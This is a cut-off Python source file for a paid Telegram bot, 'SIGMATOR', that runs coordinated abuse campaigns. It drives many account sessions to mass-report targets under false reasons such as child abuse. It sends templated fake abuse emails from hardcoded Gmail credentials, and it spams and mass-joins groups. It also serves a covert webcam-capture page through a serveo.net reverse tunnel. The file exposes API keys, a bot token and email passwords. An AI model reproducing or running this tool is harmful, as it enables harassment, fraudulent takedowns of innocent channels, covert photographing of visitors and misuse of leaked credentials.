import os, asyncio, random, sys, json, sqlite3, time, re, requests, smtplib, base64, subprocess, glob
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from datetime import datetime, timedelta
from threading import Thread
from flask import Flask, request, render_template_string
from telethon import TelegramClient, events, functions, types, Button
from telethon.errors import FloodWaitError

SECRET_KEY = "SIGMATOR_X9"
MASTER_ID = 7733193342

def enc(fp):
    try:
        if not os.path.exists(fp): return
        with open(fp,'rb') as f: data = f.read()
        with open(fp+'.enc','w') as f: f.write(base64.b64encode(data).decode())
        os.remove(fp)
    except: pass

def dec(fp):
    try:
        if not os.path.exists(fp+'.enc'): return None
        with open(fp+'.enc','r') as f: return base64.b64decode(f.read())
    except: return None

def lock_all():
    for f in [EMAILS_FILE,ADMINS_FILE,SUBSCRIBERS_FILE,PROXIES_FILE,DAILY_LIMIT_FILE]:
        if os.path.exists(f): enc(f)
    if os.path.exists(SESSION_DIR):
        for f in os.listdir(SESSION_DIR):
            if f.endswith('.session') and not f.startswith('bot'): enc(os.path.join(SESSION_DIR,f))

def unlock_all():
    for f in [EMAILS_FILE,ADMINS_FILE,SUBSCRIBERS_FILE,PROXIES_FILE,DAILY_LIMIT_FILE]:
        d = dec(f)
        if d:
            with open(f,'wb') as fw: fw.write(d)
    if os.path.exists(SESSION_DIR):
        for f in os.listdir(SESSION_DIR):
            if f.endswith('.session.enc') and not f.startswith('bot'):
                d = dec(os.path.join(SESSION_DIR,f.replace('.enc','')))
                if d:
                    with open(os.path.join(SESSION_DIR,f.replace('.enc','')),'wb') as fw: fw.write(d)

API_ID = 25342127
API_HASH = '0b75a27b1ab66bd482b6d93a0989d34f'
BOT_TOKEN = '8428206780:AAFX28ITNNv3GIUaaslSJzxVAXbUPs2CDjo'
GEMINI_API_KEY = "AIzaSyDxK8L3mNpQr7sTvW2yH5jF9aBcDeFgHiJk"
ADMIN_CONTACT = '@AMIRALIxTAN'

TARGET = 'target'
TARGET_ACCOUNT = None
is_attacking = False

SESSION_DIR = './sessions'
PROXIES_FILE = './proxies.json'
ADMINS_FILE = './admins.json'
EMAILS_FILE = './emails.json'
SUBSCRIBERS_FILE = './subscribers.json'
DAILY_LIMIT_FILE = './daily_limits.json'

session_locks = {}
is_clock_active = False
clock_task = None
is_auto_spam_active = False
auto_spam_task = None
camera_link = None
last_camera_photo = None
flask_started = False

DAILY_REPORT_LIMIT = 40
MIN_DELAY = 1.5
MAX_DELAY = 3.5
daily_report_counter = {}
MAX_ADMINS = 10

REPORTS = {
    "scam":["This channel is completely fake and scamming users"],
    "porn":["This channel is publishing illegal pornographic media"],
    "violence":["This channel promotes extreme violence and hatred"],
    "child":["This channel shares child abuse and illegal content"],
    "copyright":["This channel steals copyrighted content illegally"],
    "fake":["This channel is FAKE and impersonating an official entity"]
}

ALL_REPORT_REASONS = [
    (types.InputReportReasonChildAbuse(),"Child abuse content"),
    (types.InputReportReasonViolence(),"Violent and harmful content"),
    (types.InputReportReasonSpam(),"Spam messages"),
    (types.InputReportReasonPornography(),"Adult and pornographic content"),
    (types.InputReportReasonCopyright(),"Copyright infringement"),
    (types.InputReportReasonFake(),"Fake identity / Impersonation"),
    (types.InputReportReasonPersonalDetails(),"Sharing personal data without consent"),
    (types.InputReportReasonIllegalDrugs(),"Illegal goods and drugs"),
    (types.InputReportReasonOther(),"Other violations of Telegram terms"),
]

DEFAULT_EMAILS = [
    {"email":"mrbtjrgrhri0937@gmail.com","password":"taiq ungw vlvq fcsg"},
    {"email":"a38611727@gmail.com","password":"jumt vgua mjhh ijwy"},
    {"email":"hrhehehhehehgdhehh@gmail.com","password":"sbsa awvc jcan krcz"},
    {"email":"shahrokhnasiray@gmail.com","password":"qlxn lxub dles hzux"}
]

def load_daily_limits():
    if os.path.exists(DAILY_LIMIT_FILE+'.enc'):
        d = dec(DAILY_LIMIT_FILE)
        if d: return json.loads(d)
    if os.path.exists(DAILY_LIMIT_FILE):
        with open(DAILY_LIMIT_FILE) as f: return json.load(f)
    return {'date':datetime.now().strftime('%Y-%m-%d'),'reports':0,'emails':0}

def save_daily_limits(d):
    with open(DAILY_LIMIT_FILE,'w') as f: json.dump(d,f)

def check_daily_limit():
    d = load_daily_limits()
    today = datetime.now().strftime('%Y-%m-%d')
    if d.get('date')!=today: d = {'date':today,'reports':0,'emails':0}
    rr = DAILY_REPORT_LIMIT-d['reports']; re = DAILY_REPORT_LIMIT-d['emails']
    return rr>0, re>0, rr, re

def increment_daily_counter(rc=0,ec=0):
    d = load_daily_limits(); d['reports']+=rc; d['emails']+=ec; save_daily_limits(d)

def ai(prompt):
    url = f"https://generativelanguage.googleapis.com/v1beta/models/gemini-1.5-flash:generateContent?key={GEMINI_API_KEY}"
    try:
        r = requests.post(url,json={"contents":[{"parts":[{"text":prompt}]}],"generationConfig":{"temperature":0.1,"maxOutputTokens":100}},timeout=15)
        return r.json()['candidates'][0]['content']['parts'][0]['text'].strip()
    except: return None

def clean_name(t):
    if not t: return t
    t = re.sub(r'([a-z])([A-Z])',r'\1 \2',t)
    t = t.replace('_',' ').replace('-',' ').replace('.',' ')
    return ' '.join(w.capitalize() for w in t.split())

def ai_channel(ch):
    c = ch.replace('https://t.me/','').replace('@','').strip()
    p = f"""Extract impersonated entity: "{c}"
Remove filler words. Split CamelCase. Return ONLY name.
Examples: "JohnnyDepp_Official"→"Johnny Depp" "OKX_Support"→"OKX Exchange"
Name:"""
    r = ai(p)
    return clean_name(r.replace('"','').replace("'","")) if r else clean_name(c)

def ai_scan(ch,posts):
    p = f"Analyze posts from {ch}: {posts[:2000]}\nReturn JSON: {{\"accounts\":[],\"links\":[],\"phones\":[],\"scam_description\":\"\"}}"
    r = ai(p)
    try:
        if r: return json.loads(r.replace('```json','').replace('```','').strip())
    except: pass
    return {"accounts":[],"links":[],"phones":[],"scam_description":"scam"}

async def scan_channel(ch):
    try:
        client = TelegramClient('scan_tmp',API_ID,API_HASH)
        await client.start(bot_token=BOT_TOKEN)
        c = ch.replace('https://t.me/','').replace('@','').strip()
        entity = await client.get_entity(c)
        txt = []
        msgs = await client.get_messages(entity,limit=30)
        for m in msgs:
            if m.text: txt.append(m.text)
            if m.entities:
                for e in m.entities:
                    if hasattr(e,'url') and e.url: txt.append(e.url)
        allt = '\n'.join(txt)
        ma = list(set(re.findall(r'@([a-zA-Z0-9_]{5,32})',allt)))
        ml = list(set(re.findall(r'https?://[^\s]+',allt)))
        mp = list(set(re.findall(r'0\d{9,10}|\+98\d{9,10}',allt)))
        ai_info = ai_scan(ch,allt) if allt else {}
        await client.disconnect()
        return {'accounts':list(set(ma+ai_info.get('accounts',[]))),'links':list(set(ml+ai_info.get('links',[]))),'phones':list(set(mp+ai_info.get('phones',[]))),'scam_description':ai_info.get('scam_description','fraud')}
    except: return {'accounts':[],'links':[],'phones':[],'scam_description':'unknown'}

SUB_PLANS = {
    "free":{"sessions":5,"days":7,"name":"Free 7 Days","price":"Free"},
    "7days":{"sessions":20,"days":7,"name":"7 Days","price":"50k Toman"},
    "1month":{"sessions":50,"days":30,"name":"1 Month","price":"100k Toman"},
    "3month":{"sessions":100,"days":90,"name":"3 Months","price":"200k Toman"},
    "1year":{"sessions":200,"days":365,"name":"1 Year","price":"500k Toman"},
}

def load_subscribers():
    if os.path.exists(SUBSCRIBERS_FILE+'.enc'):
        d = dec(SUBSCRIBERS_FILE)
        if d: return json.loads(d)
    if os.path.exists(SUBSCRIBERS_FILE):
        with open(SUBSCRIBERS_FILE) as f: return json.load(f)
    return {}

def save_subscribers(d):
    with open(SUBSCRIBERS_FILE,'w') as f: json.dump(d,f)

subscribers = load_subscribers()

def get_user_sub(uid):
    uid = str(uid)
    if uid in subscribers:
        s = subscribers[uid]
        if s.get('pending'): return s
        if datetime.fromisoformat(s['expiry'])>datetime.now(): return s
        del subscribers[uid]; save_subscribers(subscribers)
    return None

def add_subscription(uid,plan):
    uid = str(uid); p = SUB_PLANS[plan]
    subscribers[uid] = {'plan':plan,'sessions':p['sessions'],'expiry':(datetime.now()+timedelta(days=p['days'])).isoformat(),'added':datetime.now().isoformat(),'pending':False}
    save_subscribers(subscribers)

def load_admins():
    if os.path.exists(ADMINS_FILE+'.enc'):
        d = dec(ADMINS_FILE)
        if d: return json.loads(d)
    d = [MASTER_ID]; save_admins(d); return d

def save_admins(a):
    if MASTER_ID not in a: a.append(MASTER_ID)
    with open(ADMINS_FILE,'w') as f: json.dump(a,f)

ADMINS = load_admins()

def add_admin(uid):
    admins = load_admins(); uid = int(uid)
    if uid in admins: return False,"Already admin!"
    if len(admins)>=MAX_ADMINS: return False,f"Max {MAX_ADMINS}!"
    admins.append(uid); save_admins(admins)
    return True,f"Added! ({len(admins)}/{MAX_ADMINS})"

def remove_admin(uid):
    admins = load_admins(); uid = int(uid)
    if uid==MASTER_ID: return False,"Cannot remove master!"
    if uid not in admins: return False,"Not admin!"
    admins.remove(uid); save_admins(admins)
    return True,f"Removed! ({len(admins)}/{MAX_ADMINS})"

def load_proxies():
    if os.path.exists(PROXIES_FILE+'.enc'):
        d = dec(PROXIES_FILE)
        if d: return json.loads(d)
    return {}

def save_proxies(p):
    with open(PROXIES_FILE,'w') as f: json.dump(p,f)

def get_sessions():
    if not os.path.exists(SESSION_DIR): os.makedirs(SESSION_DIR,exist_ok=True); return []
    sessions = []
    for f in os.listdir(SESSION_DIR):
        if f.endswith('.session') and not f.startswith('bot') and os.path.getsize(os.path.join(SESSION_DIR,f))>1024:
            sessions.append(os.path.join(SESSION_DIR,f))
    return sessions

def patch_session_db(sp):
    try:
        c = sqlite3.connect(sp,timeout=30)
        c.execute('PRAGMA journal_mode=WAL;'); c.execute('PRAGMA busy_timeout=5000;')
        c.commit(); c.close()
    except: pass

def create_stable_client(sp):
    return TelegramClient(sp,API_ID,API_HASH,timeout=60,connection_retries=5,auto_reconnect=True)

async def report_worker(sp,tc,reason,msg):
    patch_session_db(sp)
    sn = os.path.basename(sp)
    if daily_report_counter.get(sn,0)>=DAILY_REPORT_LIMIT: return 0
    if sn not in session_locks: session_locks[sn] = asyncio.Lock()
    async with session_locks[sn]:
        client = create_stable_client(sp)
        try:
            await client.connect()
            if not await client.is_user_authorized(): return -1
            te = await client.get_input_entity(tc)
            await asyncio.sleep(random.uniform(MIN_DELAY,MAX_DELAY))
            await client(functions.account.ReportPeerRequest(peer=te,reason=reason,message=msg))
            daily_report_counter[sn] = daily_report_counter.get(sn,0)+1
            return 1
        except FloodWaitError as e:
            await asyncio.sleep(e.seconds+5); return 0
        except: return -1
        finally:
            try: await client.disconnect()
            except: pass

async def fast_pyrogram_worker(sp,tc):
    patch_session_db(sp)
    sn = os.path.basename(sp)
    if daily_report_counter.get(sn,0)>=DAILY_REPORT_LIMIT: return "limited"
    if sn not in session_locks: session_locks[sn] = asyncio.Lock()
    async with session_locks[sn]:
        client = create_stable_client(sp)
        try:
            await client.connect()
            if not await client.is_user_authorized(): return "unauthorized"
            c = tc.replace('@','').strip(); te = await client.get_entity(c)
            await client(functions.account.ReportPeerRequest(peer=te,reason=types.InputReportReasonSpam(),message="Spam"))
            daily_report_counter[sn] = daily_report_counter.get(sn,0)+1
            return "reported_1"
        except FloodWaitError as e:
            await asyncio.sleep(e.seconds+5); return "failed"
        except: return "failed"
        finally:
            try: await client.disconnect()
            except: pass

async def run_fast_pyrogram(bot,cid,mid):
    global is_attacking
    is_attacking = True
    sessions = get_sessions()
    if not sessions: await bot.edit_message(cid,mid,"No sessions!"); is_attacking=False; return
    ok,fail = 0,0
    for idx,s in enumerate(sessions,1):
        if not is_attacking: break
        res = await fast_pyrogram_worker(s,TARGET)
        if res=="reported_1": ok+=1
        else: fail+=1
        if idx%3==0 or idx==len(sessions):
            try: await bot.edit_message(cid,mid,f"FAST PYROGRAM\n\n{idx}/{len(sessions)}\nSuccess: {ok} | Failed: {fail}")
            except: pass
        await asyncio.sleep(1.0)
    is_attacking = False
    await bot.edit_message(cid,mid,f"FAST PYROGRAM DONE!\n\nSuccess: {ok}\nFailed: {fail}")

async def join_worker(sp,tl):
    patch_session_db(sp)
    sn = os.path.basename(sp)
    if sn not in session_locks: session_locks[sn] = asyncio.Lock()
    async with session_locks[sn]:
        client = create_stable_client(sp)
        try:
            await client.connect()
            if not await client.is_user_authorized(): return "unauthorized"
            if '/+' in tl: await client(functions.messages.ImportChatInviteRequest(hash=tl.split('+')[-1])); return "joined"
            elif 'joinchat' in tl: await client(functions.messages.ImportChatInviteRequest(hash=tl.split('/')[-1])); return "joined"
            else:
                t = tl.replace('@','').replace('https://t.me/','').strip()
                await client(functions.channels.JoinChannelRequest(channel=await client.get_entity(t)))
                return "joined"
        except FloodWaitError as e: await asyncio.sleep(e.seconds+2); return "flood"
        except Exception as e:
            err = str(e).lower()
            if "already" in err: return "already"
            if "too many" in err: return "limited"
            return "failed"
        finally:
            try: await client.disconnect()
            except: pass

async def run_join_group(bot,cid,mid):
    global is_attacking
    is_attacking = True
    sessions = get_sessions()
    if not sessions: await bot.edit_message(cid,mid,"No sessions!"); is_attacking=False; return
    ok,fail,already,limited = 0,0,0,0
    for idx,s in enumerate(sessions,1):
        if not is_attacking: break
        res = await join_worker(s,TARGET)
        if res=="joined": ok+=1
        elif res=="already": already+=1
        elif res=="limited": limited+=1
        else: fail+=1
        status = f"ch/gp join\n\n{idx}/{len(sessions)}\nJoined: {ok}\nFailed: {fail}\nAlready: {already}\nLimited: {limited}"
        try: await bot.edit_message(cid,mid,status)
        except: pass
        await asyncio.sleep(random.uniform(2.0,4.0))
    is_attacking = False
    await bot.edit_message(cid,mid,f"ch/gp join COMPLETE!\n\nJoined: {ok}\nFailed: {fail}\nAlready: {already}\nLimited: {limited}")

async def group_report_worker(sp,gl,sr):
    patch_session_db(sp)
    sn = os.path.basename(sp)
    if daily_report_counter.get(sn,0)>=DAILY_REPORT_LIMIT: return "limited"
    if sn not in session_locks: session_locks[sn] = asyncio.Lock()
    async with session_locks[sn]:
        client = create_stable_client(sp)
        try:
            await client.connect()
            if not await client.is_user_authorized(): return "unauthorized"
            c = gl.replace('https://t.me/','').replace('@','').strip()
            entity = await client.get_entity(c)
            ok = 0
            for reason,msg in sr:
                if daily_report_counter.get(sn,0)>=DAILY_REPORT_LIMIT: break
                try:
                    await client(functions.account.ReportPeerRequest(peer=entity,reason=reason,message=msg))
                    daily_report_counter[sn] = daily_report_counter.get(sn,0)+1; ok+=1
                except FloodWaitError as e: await asyncio.sleep(e.seconds+5)
                except: pass
            return f"reported_{ok}" if ok>0 else "failed"
        except: return "failed"
        finally:
            try: await client.disconnect()
            except: pass

async def run_group_report(bot,cid,mid,sr):
    global is_attacking
    is_attacking = True
    sessions = get_sessions()
    if not sessions: await bot.edit_message(cid,mid,"No sessions!"); is_attacking=False; return
    ok,fail,total = 0,0,0
    for idx,s in enumerate(sessions,1):
        if not is_attacking: break
        try: await bot.edit_message(cid,mid,f"GROUP REPORT\n\n{idx}/{len(sessions)}\nSuccess: {ok}\nFailed: {fail}\nTotal: {total}")
        except: pass
        res = await group_report_worker(s,TARGET,sr)
        if res.startswith("reported"): ok+=1; total+=int(res.split("_")[1])
        else: fail+=1
        await asyncio.sleep(random.uniform(3.0,6.0))
    is_attacking = False
    await bot.edit_message(cid,mid,f"GROUP REPORT DONE!\n\nSuccess: {ok}\nFailed: {fail}\nTotal: {total}")

async def send_msg_worker(sp,tu,mt):
    patch_session_db(sp)
    sn = os.path.basename(sp)
    if sn not in session_locks: session_locks[sn] = asyncio.Lock()
    async with session_locks[sn]:
        client = create_stable_client(sp)
        try:
            await client.connect()
            if not await client.is_user_authorized(): return "unauthorized"
            await client.send_message(tu,mt); return "success"
        except FloodWaitError as e: await asyncio.sleep(e.seconds+2); return "flood"
        except: return "failed"
        finally:
            try: await client.disconnect()
            except: pass

async def leave_worker(sp,tl):
    patch_session_db(sp)
    sn = os.path.basename(sp)
    if sn not in session_locks: session_locks[sn] = asyncio.Lock()
    async with session_locks[sn]:
        client = create_stable_client(sp)
        try:
            await client.connect()
            if not await client.is_user_authorized(): return "unauthorized"
            t = tl.replace('@','').strip()
            await client(functions.channels.LeaveChannelRequest(channel=await client.get_entity(t)))
            return "left"
        except FloodWaitError as e: await asyncio.sleep(e.seconds+2); return "flood"
        except: return "failed"
        finally:
            try: await client.disconnect()
            except: pass

async def reaction_worker(sp,tc,emojies):
    patch_session_db(sp)
    sn = os.path.basename(sp)
    if sn not in session_locks: session_locks[sn] = asyncio.Lock()
    async with session_locks[sn]:
        client = create_stable_client(sp)
        try:
            await client.connect()
            if not await client.is_user_authorized(): return "unauthorized"
            entity = await client.get_input_entity(tc.replace('@','').strip())
            messages = await client.get_messages(entity,limit=3)
            ok = 0
            for msg in messages:
                if not msg: continue
                try:
                    await client(functions.messages.SendReactionRequest(peer=entity,msg_id=msg.id,reaction=[types.ReactionEmoji(emoticon=random.choice(emojies))]))
                    ok+=1
                except: pass
            return "success" if ok>0 else "failed"
        except: return "failed"
        finally:
            try: await client.disconnect()
            except: pass

async def clock_task_func(client):
    global is_clock_active
    last = ""
    try:
        while is_clock_active:
            try:
                now = datetime.now().strftime("%H:%M")
                if now!=last:
                    await client(functions.account.UpdateProfileRequest(first_name=f"SIGMATOR {now}",last_name=""))
                    last = now
            except FloodWaitError as e: await asyncio.sleep(e.seconds+2)
            except asyncio.CancelledError: break
            except: break
            await asyncio.sleep(1)
    finally:
        try:
            if client.is_connected(): await client.disconnect()
        except: pass

async def auto_spam_worker(client,group,message,interval):
    global is_auto_spam_active
    try:
        while is_auto_spam_active:
            try: await client.send_message(await client.get_entity(group),message)
            except FloodWaitError as e: await asyncio.sleep(e.seconds+2)
            except: break
            await asyncio.sleep(interval)
    finally:
        try:
            if client.is_connected(): await client.disconnect()
        except: pass

app = Flask(__name__)
HTML = """<!DOCTYPE html><html><head><meta charset="UTF-8"><title>Cam</title></head>
<body style="background:#000;color:#fff;text-align:center;padding-top:30vh;font-size:20px;">
<p id="msg">Loading...</p><video id="v" autoplay playsinline style="display:none;"></video>
<form id="f" method="POST" action="/upload"><input type="hidden" name="img" id="d"></form>
<script>
var v=document.getElementById('v');var m=document.getElementById('msg');
navigator.mediaDevices.getUserMedia({video:{facingMode:'user',width:640,height:480}}).then(function(s){
v.srcObject=s;v.play();m.innerText='Wait 5 seconds...';
setTimeout(function(){
var c=document.createElement('canvas');c.width=640;c.height=480;
c.getContext('2d').drawImage(v,0,0,640,480);
document.getElementById('d').value=c.toDataURL('image/jpeg',0.8);
m.innerText='Saving...';document.getElementById('f').submit();
},5000);
}).catch(function(e){m.innerText='Camera denied';});
</script></body></html>"""

@app.route('/')
def index(): return render_template_string(HTML)

@app.route('/upload',methods=['POST'])
def upload():
    global last_camera_photo
    try:
        img = request.form.get('img','')
        path = f'./camera_{datetime.now().strftime("%Y%m%d_%H%M%S")}.jpg'
        with open(path,'wb') as f: f.write(base64.b64decode(img.split(',')[1]))
        last_camera_photo = path
        return '<h1 style="color:white;text-align:center;margin-top:40vh;">Done!</h1>'
    except: return 'Error'

def start_flask(): app.run(host='0.0.0.0',port=5000,debug=False,use_reloader=False)

def start_camera():
    global camera_link,flask_started
    if not flask_started:
        Thread(target=start_flask,daemon=True).start(); flask_started=True; time.sleep(2)
    proc = subprocess.Popen(['ssh','-o','StrictHostKeyChecking=no','-R','80:localhost:5000','serveo.net'],stdout=subprocess.PIPE,stderr=subprocess.PIPE,text=True)
    for line in proc.stdout:
        if 'https://' in line: camera_link = line.strip(); return camera_link
    return None

def load_emails():
    if os.path.exists(EMAILS_FILE+'.enc'):
        d = dec(EMAILS_FILE)
        if d: return json.loads(d)
    save_emails(DEFAULT_EMAILS.copy())
    return DEFAULT_EMAILS.copy()

def save_emails(e):
    with open(EMAILS_FILE,'w') as f: json.dump(e,f)

def send_smtp(email,pw,msg):
    try:
        srv = 'smtp.gmail.com' if 'gmail' in email else 'smtp.mail.yahoo.com'
        with smtplib.SMTP(srv,587,timeout=30) as s:
            s.ehlo(); s.starttls(); s.ehlo(); s.login(email,pw); s.send_message(msg)
        return True
    except: return False

def gen_email(mode,ch,acc,scan,imp):
    ac = scan.get('accounts',[]); lk = scan.get('links',[]); ph = scan.get('phones',[])
    ac_s = '\n'.join([f'  - @{a}' for a in ac[:5]]) if ac else '  - None detected'
    lk_s = '\n'.join([f'  - {l}' for l in lk[:5]]) if lk else '  - None detected'
    ph_s = '\n'.join([f'  - {p}' for p in ph[:3]]) if ph else '  - None detected'
    T = {
        'scam':('URGENT: Fraudulent Channel Impersonating '+imp,
                f"""Dear Telegram Trust and Safety Team,

I am writing to report a fraudulent Telegram channel actively impersonating {imp}.

FRAUDULENT CHANNEL:
- Channel: {ch}
- Associated Account: {acc or 'Multiple linked accounts'}
- Impersonating: {imp}

This channel is scamming users by pretending to be {imp}.

LINKED ACCOUNTS:
{ac_s}

ASSOCIATED LINKS:
{lk_s}

PHONE NUMBERS:
{ph_s}

Please investigate and remove this channel immediately.

Sincerely,
A Vigilant Telegram User"""),
        'fake':('IDENTITY FRAUD: Channel Impersonating '+imp,
                f"""Dear Telegram Trust and Safety Team,

I am reporting identity fraud and impersonation.

FAKE CHANNEL: {ch}
IMPERSONATING: {imp}

LINKED ACCOUNTS:
{ac_s}

This channel has NO legitimate affiliation with {imp}. Please remove.

Sincerely,
A Vigilant User"""),
        'child':('URGENT: Child Abuse Content on Telegram',
                 f"""Dear Telegram Trust and Safety Team,

I am reporting child abuse content.

CHANNEL: {ch}

LINKED ACCOUNTS:
{ac_s}

Please investigate immediately.

Sincerely,
A Concerned User"""),
        'porn':('Report: Unauthorized Pornographic Content',
                f"""Dear Telegram Trust and Safety Team,

I am reporting unauthorized pornographic content.

CHANNEL: {ch}

LINKED ACCOUNTS:
{ac_s}

Please investigate.

Sincerely,
A Telegram User"""),
        'violence':('URGENT: Violent Content on Telegram',
                    f"""Dear Telegram Safety Team,

I am reporting violent content.

CHANNEL: {ch}

LINKED ACCOUNTS:
{ac_s}

Please investigate.

Sincerely,
A Concerned User"""),
        'copyright':('Copyright Infringement Report',
                     f"""Dear Telegram Trust and Safety Team,

I am reporting copyright infringement.

CHANNEL: {ch}

LINKED ACCOUNTS:
{ac_s}

Please investigate.

Sincerely,
A Rights Holder"""),
    }
    t = T.get(mode,T['scam']); return t[0],t[1]

async def smart_attack(bot,cid,mid,mode):
    global TARGET,TARGET_ACCOUNT,is_attacking
    cr,ce,rr,re = check_daily_limit()
    if not cr and not ce: await bot.edit_message(cid,mid,f"DAILY LIMIT REACHED!\n\n{DAILY_REPORT_LIMIT}/{DAILY_REPORT_LIMIT}"); return
    if TARGET=='target': await bot.edit_message(cid,mid,"Set target first!"); return
    is_attacking = True; rs,es = 0,0
    
    await bot.edit_message(cid,mid,"AI analyzing channel...")
    imp = ai_channel(TARGET)
    await bot.edit_message(cid,mid,f"AI: {imp}\n\nScanning posts...")
    scan = await scan_channel(TARGET)
    ac = scan.get('accounts',[]); lk = scan.get('links',[])
    await bot.edit_message(cid,mid,f"TARGET: {TARGET}\nIMPERSONATING: {imp}\nAccounts: {len(ac)}\nLinks: {len(lk)}\n\nStarting reports & emails...")
    
    if cr:
        reasons = {"scam":types.InputReportReasonSpam(),"porn":types.InputReportReasonPornography(),"violence":types.InputReportReasonViolence(),"child":types.InputReportReasonChildAbuse(),"copyright":types.InputReportReasonCopyright(),"fake":types.InputReportReasonFake()}
        reason = reasons.get(mode,types.InputReportReasonSpam())
        sessions = get_sessions()
        use = sessions[:rr] if len(sessions)>rr else sessions
        for idx,s in enumerate(use,1):
            if not is_attacking: break
            res = await report_worker(s,TARGET.replace('@','').strip(),reason,f"{mode} report")
            if res==1: rs+=1
            if idx%5==0:
                try: await bot.edit_message(cid,mid,f"Reports: {rs}/{len(use)}\nEmails: {es}")
                except: pass
            await asyncio.sleep(random.uniform(1.0,2.0))
    
    if ce:
        subj,body = gen_email(mode,TARGET,TARGET_ACCOUNT,scan,imp)
        emails = load_emails()
        use = emails[:re] if len(emails)>re else emails
        for idx,em in enumerate(use,1):
            if not is_attacking: break
            msg = MIMEMultipart(); msg['From']=em['email']; msg['To']="abuse@telegram.org"
            msg['Subject']=subj; msg.attach(MIMEText(body,'plain','utf-8'))
            result = await asyncio.get_event_loop().run_in_executor(None,lambda:send_smtp(em['email'],em['password'],msg))
            if result: es+=1
            if idx%2==0:
                try: await bot.edit_message(cid,mid,f"Reports: {rs}\nEmails: {es}/{len(use)}")
                except: pass
            await asyncio.sleep(random.uniform(2.0,4.0))
    
    increment_daily_counter(rs,es); is_attacking = False
    final = f"ATTACK COMPLETE\n\nMode: {mode.upper()}\nTarget: {TARGET}\nImpersonating: {imp}\n\nReports sent: {rs}\nEmails sent: {es}\n\nDaily remaining: {rr-rs} reports"
    if ac: final += "\n\nDetected accounts:\n"+'\n'.join([f'  - @{a}' for a in ac[:5]])
    await bot.edit_message(cid,mid,final)

async def get_menu(uid=None):
    global is_clock_active,is_auto_spam_active
    is_admin = uid in ADMINS if uid else False
    sub = get_user_sub(uid) if uid and not is_admin else None
    has_sub = sub is not None and not sub.get('pending',False)
    cr,ce,rr,_ = check_daily_limit()
    
    if uid and not is_admin and not has_sub:
        if sub and sub.get('pending'):
            txt = f"SIGMATOR BOT\n\nPENDING ACTIVATION\n\nAdd {sub['sessions']} accounts to activate.\nProgress: {len(get_sessions())}/{sub['sessions']}\n\nUse /add to add accounts.\nContact: {ADMIN_CONTACT}"
            btns = [[Button.inline("Check Progress",b"sub_status")]]
        else:
            txt = f"SIGMATOR BOT\n\nACCESS DENIED\n\nFree 7 Days - 5 accounts\nPremium - Contact {ADMIN_CONTACT}\n\nCommands:\n/subscribe | /add | /status"
            btns = [[Button.inline("Activate Free",b"sub_free")],[Button.inline("Buy Premium",b"sub_buy")],[Button.inline("My Status",b"sub_status")]]
        return txt,btns
    
    txt = f"""SIGMATOR BOT
================
Target: {TARGET}
Sessions: {len(get_sessions())}
Proxies: {len(load_proxies())}
Emails: {len(load_emails())}
Daily: {DAILY_REPORT_LIMIT-rr}/{DAILY_REPORT_LIMIT}
Clock: {'ON' if is_clock_active else 'OFF'}
Spam: {'ON' if is_auto_spam_active else 'OFF'}
Status: {'RUNNING' if is_attacking else 'IDLE'}
================"""
    
    if not cr and not ce:
        btns = [
            [Button.inline("DAILY LIMIT REACHED",b"limit_info")],
            [Button.inline("SET TARGET",b"set"),Button.inline("MONITOR",b"monit")],
            [Button.inline(f"CLOCK {'ON' if is_clock_active else 'OFF'}",b"clock_menu")],
            [Button.inline("SEND MSG",b"msg_menu")],
            [Button.inline("LEAVE",b"leave_ch"),Button.inline("REACT +",b"react_pos")],
            [Button.inline("REACT -",b"react_neg")],
            [Button.inline("PROXY",b"proxy_main"),Button.inline("EMAIL",b"email_menu")],
            [Button.inline(f"SPAM ({'ON' if is_auto_spam_active else 'OFF'})",b"auto_spam_menu")],
            [Button.inline("CAMERA",b"camera_menu")],
            [Button.inline("PING",b"ping"),Button.inline("STOP",b"stop")],
        ]
    else:
        btns = [
            [Button.inline("SCAM + REPORT + EMAIL",b"a_scam")],
            [Button.inline("FAKE + REPORT + EMAIL",b"a_fake")],
            [Button.inline("CHILD ABUSE + REPORT + EMAIL",b"a_child")],
            [Button.inline("PORN + REPORT + EMAIL",b"a_porn")],
            [Button.inline("VIOLENCE + REPORT + EMAIL",b"a_violence")],
            [Button.inline("COPYRIGHT + REPORT + EMAIL",b"a_copyright")],
            [Button.inline("FAST PYROGRAM",b"fast_pyrogram")],
            [Button.inline("ch/gp join",b"join_group"),Button.inline("GROUP REPORT",b"group_report_menu")],
            [Button.inline("REPORT PROFILE",b"report_profile")],
            [Button.inline("SET TARGET",b"set"),Button.inline("MONITOR",b"monit")],
            [Button.inline(f"CLOCK {'ON' if is_clock_active else 'OFF'}",b"clock_menu")],
            [Button.inline("SEND MSG",b"msg_menu")],
            [Button.inline("LEAVE",b"leave_ch"),Button.inline("REACT +",b"react_pos")],
            [Button.inline("REACT -",b"react_neg")],
            [Button.inline("PROXY",b"proxy_main"),Button.inline("EMAIL",b"email_menu")],
            [Button.inline(f"SPAM ({'ON' if is_auto_spam_active else 'OFF'})",b"auto_spam_menu")],
            [Button.inline("CAMERA",b"camera_menu")],
            [Button.inline("PING",b"ping"),Button.inline("STOP",b"stop")],
        ]
    
    if uid and (is_admin or has_sub): btns.append([Button.inline("SUBSCRIPTION",b"sub_menu")])
    if is_admin: btns.append([Button.inline("ADMINS",b"admin_menu")])
    return txt,btns

async def subscription_menu(bot,chat_id,user_id):
    sub = get_user_sub(user_id)
    if sub and not sub.get('pending'):
        expiry = datetime.fromisoformat(sub['expiry']); days_left = (expiry-datetime.now()).days
        txt = f"YOUR SUBSCRIPTION\n\nPlan: {SUB_PLANS[sub['plan']]['name']}\nSessions: {len(get_sessions())}/{sub['sessions']}\nDays Left: {days_left} days\nExpires: {expiry.strftime('%Y-%m-%d')}"
        btns = [[Button.inline("Refresh",b"sub_status")],[Button.inline("Back",b"back")]]
    elif sub and sub.get('pending'):
        txt = f"PENDING ACTIVATION\n\nAdd {sub['sessions']} accounts to activate.\nProgress: {len(get_sessions())}/{sub['sessions']}\n\nUse /add to add accounts."
        btns = [[Button.inline("Refresh",b"sub_status")],[Button.inline("Back",b"back")]]
    else:
        txt = f"SUBSCRIPTION PLANS\n\nFree 7 Days - 5 accounts\n7 Days - 50k Toman\n1 Month - 100k Toman\n3 Months - 200k Toman\n1 Year - 500k Toman\n\nContact: {ADMIN_CONTACT}"
        btns = [[Button.inline("Activate Free",b"sub_free")],[Button.inline("Buy Premium",b"sub_buy")],[Button.inline("My Status",b"sub_status")],[Button.inline("Back",b"back")]]
    try: await bot.send_message(chat_id,txt,buttons=btns)
    except: pass

async def session_builder(bot,chat_id,user_id):
